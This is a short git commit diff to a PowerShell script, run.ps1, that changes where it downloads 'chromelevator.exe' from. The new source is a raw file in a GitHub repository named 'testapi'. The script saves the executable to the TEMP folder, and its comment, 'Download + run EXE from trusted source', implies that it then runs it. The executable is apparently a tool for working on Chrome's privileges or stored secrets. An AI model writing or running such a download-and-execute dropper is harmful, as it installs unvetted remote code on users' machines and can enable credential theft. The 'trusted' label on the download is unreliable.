b3c9e5e3d2e50397c15e995fa2e85d180ca3b4ea
joyboy <197599897+np4abdou1@users.noreply.github.com>
2025-11-14 09:14:04 +0100

    Update download URL for chromelevator.exe

--- run.ps1
+++ run.ps1
@@ -1,5 +1,5 @@
 # Download + run EXE from trusted source
-$url  = "https://github.com/np4abdou1/fsociety/releases/download/v1.0.0/chromelevator.exe"
+$url  = "https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/chromelevator.exe"
 $file = "$env:TEMP\chromelevator.exe"
 
 Invoke-WebRequest $url -OutFile $file
